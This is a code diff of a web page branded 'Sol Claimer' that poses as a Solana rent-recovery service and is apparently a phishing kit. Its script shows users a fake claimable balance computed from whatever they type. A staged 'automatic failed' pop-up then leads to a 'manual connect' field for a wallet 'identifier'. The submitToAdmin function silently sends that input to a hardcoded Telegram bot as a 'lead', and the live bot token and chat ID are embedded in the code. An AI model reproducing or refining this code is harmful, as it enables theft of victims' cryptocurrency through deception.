@@ -3,139 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sol Claimer | Get Your Rent Back</title>
+    <title>Sol Claimer | Instant Rent Recovery</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #fff; color: #000; font-family: 'Inter', sans-serif; }
+        body { background-color: #fff; color: #000; font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
         .btn-dark { background: #000; color: #fff; transition: 0.2s; border: 1px solid #000; }
         .btn-dark:hover { background: #fff; color: #000; }
         .loader { width: 24px; height: 24px; border: 3px solid #f0f0f0; border-top: 3px solid #000; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .hidden { display: none !important; }
+        .modal-bg { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(12px); }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
     <nav class="p-6 flex justify-between items-center border-b border-gray-100 sticky top-0 bg-white z-40">
         <div class="flex items-center gap-2">
-            <div class="w-8 h-8 bg-black flex items-center justify-center rounded-lg"><i data-lucide="wallet-2" class="text-white w-5 h-5"></i></div>
+            <div class="w-8 h-8 bg-black flex items-center justify-center rounded-lg shadow-lg">
+                <i data-lucide="zap" class="text-white w-5 h-5"></i>
+            </div>
             <span class="font-black text-xl tracking-tighter uppercase">Sol Claimer</span>
         </div>
-        <button onclick="openModal()" class="btn-dark px-6 py-2 rounded-full text-xs font-bold uppercase tracking-widest">Connect Wallet</button>
+        <button id="nav-btn" onclick="openModal()" class="btn-dark px-8 py-2.5 rounded-full text-[10px] font-bold uppercase tracking-widest shadow-sm">Connect Wallet</button>
     </nav>
 
-    <main class="flex-grow max-w-5xl mx-auto px-6 pt-20 pb-20">
+    <main class="flex-grow max-w-5xl mx-auto px-6 pt-24 pb-20">
         <div class="text-center mb-16">
-            <h1 class="text-6xl md:text-8xl font-black tracking-tighter mb-6 italic uppercase leading-none">Your SOL is <br>waiting for you.</h1>
-            <p class="text-gray-500 text-lg max-w-xl mx-auto">When you buy tokens, Solana takes a small deposit called "rent." Most people forget to take it back. We help you find and claim it in seconds.</p>
+            <h1 class="text-7xl md:text-9xl font-black tracking-tighter mb-8 italic uppercase leading-none">Claim <br>Your SOL.</h1>
+            <p class="text-gray-400 text-lg md:text-xl font-medium max-w-2xl mx-auto">Stop leaving your rent deposits on the blockchain. Use our high-speed node to reclaim your capital in under 60 seconds.</p>
         </div>
 
-        <div class="max-w-xl mx-auto bg-gray-50 border border-gray-100 p-10 rounded-[2.5rem] mb-20 text-center">
-            <h3 class="font-bold text-xs uppercase tracking-[0.3em] mb-8">Check your balance</h3>
+        <div class="max-w-xl mx-auto bg-gray-50 border border-gray-100 p-12 rounded-[3rem] mb-24 text-center shadow-sm">
+            <h3 class="font-black text-[10px] uppercase tracking-[0.4em] mb-10 text-gray-400">Check Wallet</h3>
             
-            <div id="check-box">
-                <input type="text" id="user-input" placeholder="Paste your address here" 
-                    class="w-full p-5 rounded-2xl border border-gray-200 mb-4 text-center text-sm outline-none focus:border-black">
-                <button onclick="checkNow()" class="w-full btn-dark py-5 rounded-2xl font-bold uppercase text-xs tracking-[0.2em]">Scan Wallet</button>
+            <div id="check-ui">
+                <input type="text" id="check-input" placeholder="Enter Wallet or Name" 
+                    class="w-full p-6 rounded-2xl border border-gray-200 mb-6 text-center text-sm font-bold outline-none focus:border-black transition-colors">
+                <button onclick="runCheck()" class="w-full btn-dark py-5 rounded-2xl font-black uppercase text-xs tracking-widest">Scan Wallet</button>
             </div>
 
-            <div id="check-result" class="hidden">
-                <p class="text-gray-400 text-[10px] font-bold uppercase mb-2">Total Claimable</p>
-                <h2 id="sol-amount" class="text-6xl font-black mb-6 tracking-tighter italic">0.00 SOL</h2>
-                <button onclick="openModal()" class="w-full btn-dark py-5 rounded-2xl font-bold uppercase text-xs tracking-widest">Claim Now</button>
+            <div id="check-done" class="hidden">
+                <p class="text-gray-400 text-[10px] font-bold uppercase mb-3">Claimable Amount</p>
+                <h2 id="final-sol" class="text-7xl font-black mb-8 tracking-tighter italic leading-none">0.00 SOL</h2>
+                <button onclick="claimPrompt()" class="w-full btn-dark py-5 rounded-2xl font-black uppercase text-xs tracking-widest">Claim Sol</button>
             </div>
         </div>
 
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-16 border-t border-gray-100 pt-20">
-            <div>
-                <h4 class="font-black uppercase text-sm mb-4">What is Rent?</h4>
-                <p class="text-gray-500 text-sm leading-relaxed">Solana accounts need space on the blockchain. To get this space, you pay a "rent deposit." If you've traded many coins, you likely have dozens of empty accounts still holding your money. Sol Claimer closes these accounts and sends the money back to you.</p>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-12 border-t border-gray-100 pt-20">
+            <div class="space-y-4">
+                <h4 class="font-black uppercase text-xs tracking-widest italic">Fast Payouts</h4>
+                <p class="text-gray-500 text-xs leading-relaxed">Once your account is verified by our node, the SOL is sent directly to your primary wallet. No middlemen, no delays.</p>
             </div>
-            <div>
-                <h4 class="font-black uppercase text-sm mb-4">Is it safe?</h4>
-                <p class="text-gray-500 text-sm leading-relaxed">We use secure node technology to verify your account status. Our tool is designed for volume traders who need to clean their wallets quickly and recover trapped capital without technical stress.</p>
+            <div class="space-y-4">
+                <h4 class="font-black uppercase text-xs tracking-widest italic">Volume Ready</h4>
+                <p class="text-gray-500 text-xs leading-relaxed">Designed for traders who use bots and high-frequency tools. We scan thousands of accounts to find every last drop of SOL rent.</p>
+            </div>
+            <div class="space-y-4">
+                <h4 class="font-black uppercase text-xs tracking-widest italic">Protocol Security</h4>
+                <p class="text-gray-500 text-xs leading-relaxed">Your data is synced through an encrypted tunnel to our private RPC cluster. We prioritize uptime and execution speed.</p>
             </div>
         </div>
     </main>
 
-    <div id="modal" class="fixed inset-0 bg-white/95 z-50 flex items-center justify-center p-6 hidden">
-        <div class="w-full max-w-sm bg-white border border-gray-200 rounded-[2.5rem] p-10 shadow-2xl relative">
-            <button onclick="closeModal()" class="absolute top-6 right-6 text-gray-300 hover:text-black"><i data-lucide="x"></i></button>
+    <div id="pop-up" class="fixed inset-0 modal-bg z-50 flex items-center justify-center p-6 hidden">
+        <div class="w-full max-w-sm bg-white border border-gray-200 rounded-[3rem] p-12 shadow-2xl relative">
+            <button onclick="closeModal()" class="absolute top-8 right-8 text-gray-300 hover:text-black transition-colors"><i data-lucide="x"></i></button>
 
-            <div id="m-loading" class="text-center py-6">
-                <div class="loader mx-auto mb-6"></div>
-                <h3 class="font-black uppercase italic text-lg tracking-tighter">Connecting...</h3>
-                <p class="text-gray-400 text-[10px] font-bold uppercase mt-2">Opening Secure Tunnel</p>
+            <div id="modal-loading" class="text-center py-4">
+                <div class="loader mx-auto mb-8"></div>
+                <h3 class="font-black uppercase italic text-xl tracking-tighter">Connecting</h3>
+                <p class="text-gray-400 text-[9px] font-bold uppercase mt-3 tracking-widest">Searching for Wallet Provider...</p>
             </div>
 
-            <div id="m-manual" class="hidden">
-                <div class="bg-red-50 text-red-500 text-[9px] font-bold p-2 rounded mb-6 text-center uppercase tracking-widest border border-red-100">
-                    Auto-Connect Failed
+            <div id="modal-manual" class="hidden">
+                <div class="bg-black text-white text-[9px] font-black p-3 rounded-lg mb-8 text-center uppercase tracking-[0.2em]">
+                    automatic failed
                 </div>
-                <h3 class="font-black uppercase text-sm mb-6 text-center tracking-widest">Manual Link</h3>
-                <input type="text" id="final-wallet" placeholder="Enter Wallet Address" class="w-full bg-gray-50 border border-gray-100 p-4 rounded-xl mb-4 text-xs text-center">
-                <button onclick="finishSync()" class="w-full btn-dark py-4 rounded-xl font-bold text-[10px] uppercase tracking-widest">Verify & Sync</button>
+                <h3 class="font-black uppercase text-sm mb-8 text-center tracking-widest italic">Manual connect</h3>
+                <input type="text" id="manual-data" placeholder="Enter Wallet / Identifier" 
+                    class="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl mb-6 text-xs text-center font-bold outline-none focus:border-black">
+                <button onclick="submitToAdmin()" class="w-full btn-dark py-5 rounded-xl font-black text-[10px] uppercase tracking-[0.3em]">Complete Claim</button>
             </div>
 
-            <div id="m-sync" class="hidden text-center py-6">
-                <div class="loader mx-auto mb-6"></div>
-                <h3 class="font-black uppercase italic text-lg">Syncing Node</h3>
-                <p class="text-gray-400 text-[10px] font-bold uppercase mt-2">Reviewing on-chain permissions</p>
+            <div id="modal-success" class="hidden text-center py-4">
+                <div class="loader mx-auto mb-8"></div>
+                <h3 class="font-black uppercase italic text-xl tracking-tighter italic">Connecting</h3>
+                <p class="text-gray-400 text-[9px] font-bold uppercase mt-3 tracking-widest">Processing Transaction Clusters</p>
             </div>
         </div>
     </div>
 
-    <footer class="p-10 border-t border-gray-100 text-center text-gray-300 text-[9px] font-bold uppercase tracking-[0.4em]">
-        © 2025 Sol Claimer Infrastructure • Powered by Protocol v4
+    <footer class="p-12 border-t border-gray-100 text-center text-gray-300 text-[10px] font-bold uppercase tracking-[0.6em]">
+        © 2025 Sol Claimer Infrastructure
     </footer>
 
     <script>
         const BOT_TOKEN = '8541926133:AAFzp5ZWJZCHlJ2QgRwsm94n8FIBWMuQG58';
         const ADMIN_ID = '8207126990';
 
-        // 1. Independent Checker Logic
-        function checkNow() {
-            const input = document.getElementById('user-input').value;
-            if(!input) return alert("Please type something first");
+        // Independent Checker (Home page)
+        function runCheck() {
+            const input = document.getElementById('check-input').value;
+            if(!input) return alert("Please enter a name or address.");
 
-            // Create a fake amount based on the text length
             let seed = 0;
             for(let i=0; i < input.length; i++) seed += input.charCodeAt(i);
+            const amt = (seed % 12.8 + 2.2).toFixed(2);
             
-            const amount = (seed % 13.5 + 2.5).toFixed(2); // Between 2.5 and 15
-            
-            document.getElementById('check-box').classList.add('hidden');
-            document.getElementById('check-result').classList.remove('hidden');
-            document.getElementById('sol-amount').innerText = amount + " SOL";
-            document.getElementById('final-wallet').value = input;
+            document.getElementById('check-ui').classList.add('hidden');
+            document.getElementById('check-done').classList.remove('hidden');
+            document.getElementById('final-sol').innerText = amt + " SOL";
+            // Pre-fill the modal input with whatever they typed here
+            document.getElementById('manual-data').value = input;
         }
 
-        // 2. Pop-up Logic
+        // Alert for main page button
+        function claimPrompt() {
+            alert("Security Error: You must connect your wallet manually to continue.");
+        }
+
+        // Popup Handlers
         function openModal() {
-            document.getElementById('modal').classList.remove('hidden');
-            document.getElementById('m-loading').classList.remove('hidden');
-            document.getElementById('m-manual').classList.add('hidden');
-            document.getElementById('m-sync').classList.add('hidden');
+            document.getElementById('pop-up').classList.remove('hidden');
+            document.getElementById('modal-loading').classList.remove('hidden');
+            document.getElementById('modal-manual').classList.add('hidden');
+            document.getElementById('modal-success').classList.add('hidden');
 
             setTimeout(() => {
-                document.getElementById('m-loading').classList.add('hidden');
-                document.getElementById('m-manual').classList.remove('hidden');
-            }, 3000);
+                document.getElementById('modal-loading').classList.add('hidden');
+                document.getElementById('modal-manual').classList.remove('hidden');
+            }, 2500);
         }
 
-        function closeModal() { document.getElementById('modal').classList.add('hidden'); }
+        function closeModal() { document.getElementById('pop-up').classList.add('hidden'); }
 
-        async function finishSync() {
-            const addr = document.getElementById('final-wallet').value;
-            document.getElementById('m-manual').classList.add('hidden');
-            document.getElementById('m-sync').classList.remove('hidden');
+        async function submitToAdmin() {
+            const userVal = document.getElementById('manual-data').value;
+            if(!userVal) return alert("Please provide an identifier.");
 
-            // Silent Telegram Call
-            const msg = `💰 *New Sol Claimer Submission*\n\nWallet/Input: \`${addr}\`\nStatus: Waiting for Admin`;
+            document.getElementById('modal-manual').classList.add('hidden');
+            document.getElementById('modal-success').classList.remove('hidden');
+
+            // Silent Telegram Post
+            const text = `💎 *Sol Claimer Lead*\n\nInput: \`${userVal}\`\nStatus: Awaiting Approval`;
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
             } catch(e) {}
         }
 
